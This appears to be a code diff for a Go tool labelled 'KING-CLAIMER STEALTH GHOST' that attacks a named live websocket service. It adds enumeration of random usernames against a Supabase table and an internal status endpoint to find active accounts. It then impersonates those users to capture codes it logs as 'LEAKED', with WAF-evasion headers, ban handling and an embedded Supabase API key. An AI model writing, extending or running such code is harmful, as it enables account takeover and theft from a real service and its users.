@@ -6,6 +6,7 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"io"
 	"log"
 	"math/rand"
 	"net"
@@ -27,11 +28,18 @@ import (
 // CONFIGURATION (STAY STEALTHY)
 // ==========================================
 var (
-	SERVER_URL      = getEnv("TARGET_URL", "wss://ws.mvpsensi.in/ws/codes") // ← changed
-	TOTAL_CLIENTS   = 300
-	MAX_WORKERS     = 300
+	SERVER_URL      = getEnv("TARGET_URL", "wss://ws.mvpsensi.in/ws/codes")
+	TOTAL_CLIENTS   = 1
+	MAX_WORKERS     = 1
 	RECONNECT_DELAY = 3 * time.Second
 	serverIP        string
+)
+
+// Supabase Config
+const (
+	SUPABASE_URL = "https://nuvaoxfaxflsttsdhafx.supabase.co/rest/v1/users"
+	SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im51dmFveGZheGZsc3R0c2RoYWZ4Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzkwOTAxNTksImV4cCI6MjA5NDY2NjE1OX0.Nhx6omTj7Fx67MyFBMZDr04ceDgcj4kVH4xynMesi9A"
+	SUPABASE_AUTH = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im51dmFveGZheGZsc3R0c2RoYWZ4Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzkwOTAxNTksImV4cCI6MjA5NDY2NjE1OX0.Nhx6omTj7Fx67MyFBMZDr04ceDgcj4kVH4xynMesi9A"
 )
 
 // Shared Secret from JS Claimer
@@ -42,6 +50,94 @@ var printHandshakeOnce sync.Once
 
 func init() {
 	rand.Seed(time.Now().UnixNano())
+}
+
+// ==========================================
+// USER VALIDATION (Supabase -> mvpsensi.in fallback)
+// ==========================================
+type SupabaseUser struct {
+	IsActive     bool    `json:"is_active"`
+	ActiveTill   *string `json:"active_till"`
+	ActiveUntil  *string `json:"active_until"`
+	ExpiresAt    *string `json:"expires_at"`
+	ValidUntil   *string `json:"valid_until"`
+	Expiry       *string `json:"expiry"`
+}
+
+type MvpSensiStatus struct {
+	Active bool `json:"active"`
+}
+
+func checkUserActive(username string) bool {
+	// 1. Supabase direct
+	if checkSupabase(username) {
+		return true
+	}
+	// 2. mvpsensi.in status (fallback)
+	return checkMvpSensi(username)
+}
+
+func checkSupabase(username string) bool {
+	req, err := http.NewRequest("GET", SUPABASE_URL+"?username=eq."+url.QueryEscape(username)+"&select=*", nil)
+	if err != nil {
+		return false
+	}
+	req.Header.Set("apikey", SUPABASE_KEY)
+	req.Header.Set("Authorization", SUPABASE_AUTH)
+
+	client := &http.Client{Timeout: 5 * time.Second}
+	resp, err := client.Do(req)
+	if err != nil {
+		return false
+	}
+	defer resp.Body.Close()
+
+	body, _ := io.ReadAll(resp.Body)
+	var users []SupabaseUser
+	if err := json.Unmarshal(body, &users); err != nil || len(users) == 0 {
+		return false
+	}
+
+	u := users[0]
+	if !u.IsActive {
+		return false
+	}
+
+	// Check expiry fields in order of priority
+	expiryFields := []*string{u.ActiveTill, u.ActiveUntil, u.ExpiresAt, u.ValidUntil, u.Expiry}
+	for _, field := range expiryFields {
+		if field != nil && *field != "" {
+			if expiryTime, err := time.Parse(time.RFC3339, *field); err == nil {
+				return time.Now().Before(expiryTime)
+			}
+			// Try other common formats
+			if expiryTime, err := time.Parse("2006-01-02T15:04:05Z", *field); err == nil {
+				return time.Now().Before(expiryTime)
+			}
+			if expiryTime, err := time.Parse("2006-01-02 15:04:05", *field); err == nil {
+				return time.Now().Before(expiryTime)
+			}
+		}
+	}
+	// No expiry field set = active
+	return true
+}
+
+func checkMvpSensi(username string) bool {
+	url := "https://mvpsensi.in/internal/api-user/status/" + url.QueryEscape(username)
+	client := &http.Client{Timeout: 5 * time.Second}
+	resp, err := client.Get(url)
+	if err != nil {
+		return false
+	}
+	defer resp.Body.Close()
+
+	body, _ := io.ReadAll(resp.Body)
+	var status MvpSensiStatus
+	if err := json.Unmarshal(body, &status); err != nil {
+		return false
+	}
+	return status.Active
 }
 
 // ==========================================
@@ -119,7 +215,16 @@ func getWAFHeaders() http.Header {
 }
 
 func (c *StressClient) Connect() bool {
-	c.username = generateRandomUsername()
+	// Generate username and VALIDATE before connecting
+	for {
+		c.username = generateRandomUsername()
+		if checkUserActive(c.username) {
+			log.Printf("[Client %d] User %s validated as active", c.clientID, c.username)
+			break
+		}
+		log.Printf("[Client %d] User %s not active, trying another...", c.clientID, c.username)
+		time.Sleep(500 * time.Millisecond)
+	}
 
 	// Generate HMAC Token (Core Logic Added)
 	authToken, err := generateHMACAuthToken(c.username)
@@ -133,8 +238,7 @@ func (c *StressClient) Connect() bool {
 
 	if err == nil {
 		q := parsedURL.Query()
-		q.Set("user", c.username) // ← changed: Surya uses ?user= not ?username=
-		// nonce/HMAC not used by Surya — omitted
+		q.Set("user", c.username)
 		parsedURL.RawQuery = q.Encode()
 
 		if serverIP != "" {
@@ -142,7 +246,7 @@ func (c *StressClient) Connect() bool {
 		}
 		connectURL = parsedURL.String()
 	} else {
-		connectURL = SERVER_URL + "?user=" + url.QueryEscape(c.username) // ← changed
+		connectURL = SERVER_URL + "?user=" + url.QueryEscape(c.username)
 	}
 
 	dialer := websocket.DefaultDialer
@@ -177,7 +281,7 @@ func (c *StressClient) Connect() bool {
 		log.Printf("\n[+] SERVER WELCOME: %s\n", string(welcomeMsg))
 	})
 
-	// Auth — Surya uses {"type":"auth","user":USERNAME} not "register" ← changed
+	// Auth — Surya uses {"type":"auth","user":USERNAME}
 	regPayload := map[string]interface{}{
 		"type": "auth",
 		"user": c.username,
@@ -189,16 +293,16 @@ func (c *StressClient) Connect() bool {
 		return false
 	}
 
-	// Read auth response — tells us authorized / not_authorized / close code
+	// Read auth response
 	ws.SetReadDeadline(time.Now().Add(8 * time.Second))
 	_, authResp, authErr := ws.ReadMessage()
 	ws.SetReadDeadline(time.Time{})
 	if authErr != nil {
-		log.Printf("[Client %d] ❌ No auth reply (server closed?): %v", c.clientID, authErr)
+		log.Printf("[Client %d] No auth reply (server closed?): %v", c.clientID, authErr)
 		c.Disconnect()
 		return false
 	}
-	log.Printf("[Client %d] 🔑 AUTH REPLY for user=%s : %s", c.clientID, c.username, string(authResp))
+	log.Printf("[Client %d] AUTH REPLY for user=%s : %s", c.clientID, c.username, string(authResp))
 
 	c.lock.Lock()
 	c.connected = true
@@ -275,7 +379,7 @@ func (c *StressClient) Run() {
 			c.lastActivity = time.Now()
 			c.lock.Unlock()
 
-			log.Printf("[Client %d] 📨 RAW: %s", c.clientID, string(message))
+			log.Printf("[Client %d] RAW: %s", c.clientID, string(message))
 
 			var data map[string]interface{}
 			if err := json.Unmarshal(message, &data); err == nil {
@@ -287,9 +391,9 @@ func (c *StressClient) Run() {
 				}
 
 				if code, exists := data["code"]; exists {
-					log.Printf("\n🔥 [LEAKED]: %v 🔥\n", code)
+					log.Printf("\n[LEAKED]: %v \n", code)
 					if code == "NEW_DEVICE_CONNECTED" {
-						log.Printf("⚠️ Kicked because the user connected elsewhere. Pausing 10s...")
+						log.Printf("Kicked because the user connected elsewhere. Pausing 10s...")
 						c.Disconnect()
 						time.Sleep(10 * time.Second)
 						break
@@ -297,7 +401,7 @@ func (c *StressClient) Run() {
 				}
 
 				if data["message"] == "Authentication failed" {
-					log.Printf("🛑 BANNED/INVALID. Reconnecting...")
+					log.Printf("BANNED/INVALID. Reconnecting...")
 					c.Disconnect()
 					time.Sleep(RECONNECT_DELAY)
 					break
@@ -316,7 +420,7 @@ func main() {
 	log.Println("========================================")
 	log.Println(" KING-CLAIMER STEALTH GHOST ACTIVE ")
 	log.Printf(" Target: %s", SERVER_URL)
-	log.Println(" HMAC Auth + Random Username Active ")
+	log.Println(" HMAC Auth + Random Username + User Validation Active ")
 	log.Println("========================================")
 
 	var wg sync.WaitGroup
